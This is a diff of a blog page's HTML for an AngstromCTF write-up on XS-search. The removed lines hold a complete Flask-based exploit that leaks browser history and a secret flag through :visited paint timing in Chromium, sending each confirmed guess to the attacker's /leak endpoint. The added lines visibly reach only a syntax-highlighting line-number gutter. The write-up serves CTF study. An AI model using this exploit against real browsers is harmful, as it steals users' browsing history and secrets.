@@ -68,7 +68,7 @@ Link tags and Error events .
   "headline": "WaterMark as a Service AngstromCTF",
   "description" : "tl;dr\nXS-search 200 \/ 404 . Leaking using HTML injection in a same-site challenge. Link tags and Error events . ",
   "inLanguage" : "en",
-  "wordCount":  1336 ,
+  "wordCount":  1599 ,
   "datePublished" : "2024-05-26T21:01:42\u002b05:30",
   "dateModified" : "2024-05-26T21:01:42\u002b05:30",
   "image" : "https:\/\/Alfinj0se.github.io\/img\/pfp.jpg",
@@ -404,273 +404,541 @@ We can use a script,link tags to determine if it was <strong>200</strong> or <st
 <p><code>actf{the_w_watermarks_the_whereabouts}</code></p>
 <h2 id="-intended-solution">🤯 Intended solution</h2>
 <p>This was actually not the solution, this leak worked only because the headless chrome used on the admin bot was outdated. In the new chrome this won&rsquo;t work due to <a href="https://github.com/annevk/orb">ORB</a>.</p>
-<p>ORB will prevent the onload handler from being triggered if the content type of the requested resource is diffrent from the inclusion method. So since we are using a script tag here to load the response of a <strong>text/html</strong> content type it wont get loaded.</p>
+<p>ORB will prevent the onload handler from being triggered if the content type of the requested resource is diffrent from the inclusion method. So since we are using a script tag here to load the response of a <strong>text/html</strong> content type, so it wont get loaded.</p>
 <p>So we can&rsquo;t use script,link stylesheets etc for leaking as there will be a <strong>content-type mismatch</strong> for the request resource.</p>
 <p>The intended solution was to use <strong>Complicated CSS effects</strong> and <strong>:visited selector</strong> to leak browser history through <strong>paint timing</strong> .It was a <a href="https://issues.chromium.org/issues/40091173">chromium bug</a> which was marked as won&rsquo;t fix .</p>
 <p>This was the exploit for it shared by <a href="https://x.com/ixSly">@ixSly</a>.</p>
-<pre tabindex="0"><code class="language-python=" data-lang="python=">import os
-from flask import Flask, render_template_string, request
-
-app = Flask(__name__)
-URL = &#34;http://127.0.0.1:21111/&#34;
-CHARSET = &#34;1234567890&#34; # for local testing 
-#CHARSET = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;
-ex_html = &#39;&#39;&#39;
-&lt;!DOCTYPE html&gt;
-&lt;html lang=&#34;en&#34;&gt;
-&lt;head&gt;
-    &lt;meta charset=&#34;UTF-8&#34;&gt;
-    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
-    &lt;title&gt;XS-Leak Test&lt;/title&gt;
-    &lt;style type=&#34;text/css&#34;&gt;
-        /* Set it up so the target link element has different colors when pointing to a
-           visited vs unvisited URL. */
-        #target {
-            color: white;
-            background-color: white;
-            outline-color: white;
-        }
-        #target:visited {
-            color: #feffff;
-            background-color: #fffeff;
-            outline-color: #fffffe;
-        }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;script&gt;
-    async function isVisited(url) {
-        let pocw = window.open(`/poc?url=${encodeURIComponent(url)}`, &#39;poc&#39;);
-        pocw.focus();
-    }
-
-    // Extract the fragment identifier from the URL
-    let hash = window.location.hash.substring(1) || &#34;flag{g68r|a&#34;;
-    let [guess, current_guess] = hash.split(&#39;|&#39;);
-    let base_url = &#39;{{CHALLENGE_URL}}search?q=flag{&#39;; //change based on flag format
-    let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
-
-    async function exploit(current_guess) {
-        let w = open(`${base_url}${guess}${current_guess}`, &#39;guess&#39;);
-        await new Promise((resolve) =&gt; setTimeout(resolve, 1000));
-        w.close();
-        isVisited(`${base_url}${guess}${current_guess}`);
-    }
-    exploit(current_guess);
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-&#39;&#39;&#39;
-
-poc_html = &#39;&#39;&#39;
-&lt;!doctype html&gt;
-&lt;html lang=&#34;en&#34;&gt;
-&lt;head&gt;
-    &lt;meta charset=&#34;utf-8&#34;/&gt;
-    &lt;style type=&#34;text/css&#34;&gt;
-        #target {
-            color: white;
-            background-color: white;
-            outline-color: white;
-        }
-        #target:visited {
-            color: #feffff;
-            background-color: #fffeff;
-            outline-color: #fffffe;
-        }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;div id=&#34;entryDisplay&#34;&gt;
-        Enter a URL to test for visited status:
-        &lt;input id=&#34;urlInput&#34; type=&#34;text&#34; size=&#34;60&#34; value=&#34;{{ url }}&#34; autofocus/&gt;
-        &lt;button id=&#34;testButton&#34;&gt;Test&lt;/button&gt;
-    &lt;/div&gt;
-    &lt;script type=&#34;text/javascript&#34;&gt;
-        (function () {
-            var entryDisplay = document.getElementById(&#39;entryDisplay&#39;);
-            var urlInput = document.getElementById(&#39;urlInput&#39;);
-            var testButton = document.getElementById(&#39;testButton&#39;);
-            
-            var basisUrl;
-            var controlUrl;
-            var experimentUrl;
-            
-            var targetLink;
-            var controlTickCount;
-
-            function generateUnvisitedUrl () {
-                return &#39;https://&#39; + Math.random() + &#39;/&#39; + Date.now();
-            }
-            
-            testButton.addEventListener(&#39;click&#39;, function () {
-                basisUrl = generateUnvisitedUrl();
-                controlUrl = generateUnvisitedUrl();
-                experimentUrl = urlInput.value;
-                console.log({ experimentUrl })
-                entryDisplay.remove();
-                
-                document.body.style.overflow = &#39;hidden&#39;;
-                
-                targetLink = document.createElement(&#39;a&#39;);
-                targetLink.id = &#39;target&#39;;
-                targetLink.href = basisUrl;
-                
-                var garbageText = &#39;業雲多受片主...&#39;.repeat(28);
-                targetLink.appendChild(document.createTextNode(garbageText));
-                
-                targetLink.style.display = &#39;block&#39;;
-                targetLink.style.width = &#39;5px&#39;;
-                targetLink.style.fontSize = &#39;2px&#39;;
-                targetLink.style.outlineWidth = &#39;24px&#39;;
-                targetLink.style.textAlign = &#39;center&#39;;
-                targetLink.style.filter =
-                    &#39;contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%)&#39;;
-                targetLink.style.textShadow = &#39;16px 16px 10px #fefffe&#39;;
-                targetLink.style.transform = &#39;perspective(100px) rotateY(37deg)&#39;;
-                
-                document.body.appendChild(targetLink);
-                
-                requestAnimationFrame(function () {
-                    requestAnimationFrame(function () {
-                        runTestStage(false);
-                    });
-                });
-            });
-            
-            function runTestStage (isExperimentStage) {
-                var testUrl = isExperimentStage ? experimentUrl : controlUrl;
-                startCountingTicks();
-                startOscillatingHref(testUrl);
-                
-                setTimeout(async function () {
-                    stopOscillatingHref();
-                    
-                    if (!isExperimentStage) {
-                        controlTickCount = stopCountingTicks();
-                        runTestStage(true);
-                        return;
-                    }
-                    
-                    var experimentTickCount = stopCountingTicks();
-                    targetLink.remove();
-                    
-                    var ratio = experimentTickCount / controlTickCount;
-                    console.log(&#34;RATIO&#34;, experimentTickCount, controlTickCount, ratio)
-                    var likelyVisited = ratio &lt; 0.7;
-                   
-                    async function sendBeacon(cond){
-                        let url = opener ? opener.location.hash.substring(1) : &#34;flag{g68r|a&#34;;
-                        let [guess, current_guess] = url.split(&#39;|&#39;);
-                        if(cond){
-                            await fetch(`/leak?flag=${guess}${current_guess}`);
-                            if (opener) {
-                                opener.location.href = `/?query=${Math.random()}&amp;ratio=${ratio}#${guess}${current_guess}|a`;
-                            }
-                        }
-                        else {
-                            let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
-                            if (opener) {
-                                opener.location.href = `/?query=${Math.random()}&amp;ratio=${ratio}#${guess}|${charset[charset.indexOf(current_guess)+1]}`;
-                            }
-                        }
-                    }
-                    sendBeacon(likelyVisited);
-
-                    document.body.style.overflow = &#39;visible&#39;;
-                    
-                    var outputDom = document.createElement(&#39;p&#39;);
-                    
-                    outputDom.appendChild(document.createTextNode(&#39;Result for &#39;));
-                    
-                    var linkDom = document.createElement(&#39;a&#39;);
-                    linkDom.href = experimentUrl;
-                    linkDom.appendChild(document.createTextNode(experimentUrl));
-                    outputDom.appendChild(linkDom);
-                    
-                    outputDom.appendChild(document.createTextNode(&#39;: likely &#39;));
-                    
-                    var resultDom = document.createElement(&#39;strong&#39;);
-                    resultDom.innerHTML = likelyVisited ? &#39;VISITED&#39; : &#39;UNVISITED&#39;;
-                    resultDom.style.color = likelyVisited ? &#39;green&#39; : &#39;red&#39;;
-                    outputDom.appendChild(resultDom);
-                    
-                    outputDom.appendChild(document.createTextNode(
-                        &#39; (&#39; + experimentTickCount + &#39; ticks vs &#39; +
-                        controlTickCount + &#39; ticks; ratio = &#39; +
-                        Math.round(ratio * 100) + &#39;%).&#39;));
-                    
-                    document.body.appendChild(outputDom);
-                    
-                    var retryButton = document.createElement(&#39;button&#39;);
-                    retryButton.innerHTML = &#39;Try Another URL&#39;;
-                    retryButton.addEventListener(&#39;click&#39;, function (e) {
-                        location.reload();
-                    });
-                    document.body.appendChild(retryButton);
-                    retryButton.focus();
-                }, 500);
-            } 
-                
-            var oscillateInterval;
-            var isPointingToBasisUrl = true;
-            function startOscillatingHref (testUrl) {
-                oscillateInterval = setInterval(function () {
-                    targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
-                    isPointingToBasisUrl = !isPointingToBasisUrl;
-                }, 0);
-            }
-            function stopOscillatingHref () {
-                clearInterval(oscillateInterval);
-                targetLink.href = basisUrl;
-                isPointingToBasisUrl = true;
-            }
-
-            var tickCount = 0;
-            var tickRequestId;
-            function startCountingTicks () {
-                tickRequestId = requestAnimationFrame(function () {
-                    ++tickCount;
-                    startCountingTicks();
-                });
-            }
-            function stopCountingTicks () {
-                cancelAnimationFrame(tickRequestId);
-                var oldTickCount = tickCount;
-                tickCount = 0;
-                return oldTickCount;
-            }
-        })();
-        
-        setTimeout(function () {
-            var testButton = document.getElementById(&#39;testButton&#39;);
-            testButton.click();
-        }, 1000);
-   
-    &lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-&#39;&#39;&#39;
-
-@app.route(&#39;/&#39;)
-def index():
-    return render_template_string(ex_html, CHALLENGE_URL=URL,CHARSET=CHARSET)
-
-@app.route(&#39;/poc&#39;)
-def poc():
-    args = request.args.get(&#39;url&#39;)
-    return render_template_string(poc_html, url=args, CHALLENGE_URL=URL,CHARSET=CHARSET)
-
-@app.route(&#39;/leak&#39;)
-def leak():
-    flag = request.args.get(&#39;flag&#39;)
-    if flag[-1] == &#39;}&#39;:
-        print(flag)
-    return &#34;&#34;
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&#39;0.0.0.0&#39;,port=1337)
-</code></pre>
+<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
